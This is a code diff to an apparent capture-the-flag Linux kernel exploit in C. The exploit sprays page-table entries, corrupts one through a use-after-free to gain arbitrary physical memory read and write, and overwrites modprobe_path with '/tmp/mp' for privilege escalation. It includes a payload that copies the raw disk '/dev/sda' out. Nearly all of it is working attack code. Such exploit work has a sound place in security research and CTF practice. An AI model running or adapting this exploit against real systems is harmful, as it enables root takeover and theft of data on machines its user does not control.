@@ -9,6 +9,7 @@
 
 /*
  * inspired by https://ptr-yudai.hatenablog.com/entry/2023/12/08/093606#UAF-in-physical-memory
+ * this version overwrite modprobe for privilige escalation
  */
 
 #define PAYLOAD "#!/bin/sh\ncat /dev/sda > /tmp/flag"
@@ -60,7 +61,7 @@ int main(int argc, char* argv[]) {
   puts("[+] spray PTEs");
   for (int i = 0; i < N_SPRAY; i++)
     for (int j = 0; j < 8; j++)
-      *(uint64_t*)(spray[i] + j*0x1000) = 0xdeadbeefcafebabe;
+      *(uint64_t*)(spray[i] + j*0x1000) = 0x6fe1be2;
 
 #ifdef DEBUG
   keap_read(ptr, leak, PTE_SIZE);
@@ -80,7 +81,7 @@ int main(int argc, char* argv[]) {
   uint64_t physbase = 0;
   for (int i = 0; i < N_SPRAY; i ++) {
     for (int j = 0; j < 8; j++) {
-      if (*(uint64_t*)(spray[i]+j*0x1000) != 0xdeadbeefcafebabe) {
+      if (*(uint64_t*)(spray[i]+j*0x1000) != 0x6fe1be2) {
         vuln = (uint64_t*)(spray[i]+j*0x1000);
         physbase = (*vuln & ~0xfff);
         break;
@@ -96,11 +97,11 @@ int main(int argc, char* argv[]) {
 
   puts("[+] corrupt PTE into AAW/AAR");
   // find/g 0xffff888000000000, 0xffff888005000000, 0x6f6d2f6e6962732f
-  uint64_t modprobe = 0x1eac000;
+  uint64_t modprobe = 0x1eac600;
   // physbase with nokaslr + 0x3000
   uint64_t offset = 0x2401000 + 0x3000;
 
-  pte = 0x8000000000000067|(physbase+modprobe-offset);
+  pte = 0x8000000000000067|(physbase+(modprobe&~0xfff)-offset);
 
   keap_write(ptr, &pte, 0x8);
 
@@ -110,10 +111,11 @@ int main(int argc, char* argv[]) {
 #endif
 
   // reload pte or sth idk
+  uint64_t old_vuln = vuln;
   vuln = NULL;
   for (int i = 0; i < N_SPRAY; i ++) {
     for (int j = 0; j < 8; j++) {
-      if (*(uint64_t*)(spray[i]+j*0x1000) != 0xdeadbeefcafebabe) {
+      if (*(uint64_t*)(spray[i]+j*0x1000) != 0x6fe1be2) {
         vuln = (uint64_t*)(spray[i]+j*0x1000);
         break;
       }
@@ -121,24 +123,10 @@ int main(int argc, char* argv[]) {
     if (vuln)
       break;
   }
-
-  puts("[+] finding modprobe_path offset");
-  int off = -1;
-  for(int i = 0; i < 0x200; ++i){
-    if(vuln[i] == *(uint64_t*) "/sbin/modprobe") {
-      off = i;
-      break;
-    }
-  } 
-  CHK(off != -1);
-
-  printf("[+] found modprobe at offset = 0x%lx\n", off*8);
-#ifdef DEBUG
-  print_hex(&vuln[off], 0x40);
-#endif
+  CHK(vuln == old_vuln);
 
   puts("[+] overwriting modprobe_path");
-  vuln[off] = *(uint64_t*) "/tmp/mp";
+  vuln[(modprobe&0xfff)/8] = *(uint64_t*) "/tmp/mp";
 
 #ifdef DEBUG
   print_hex(vuln, 0x40);
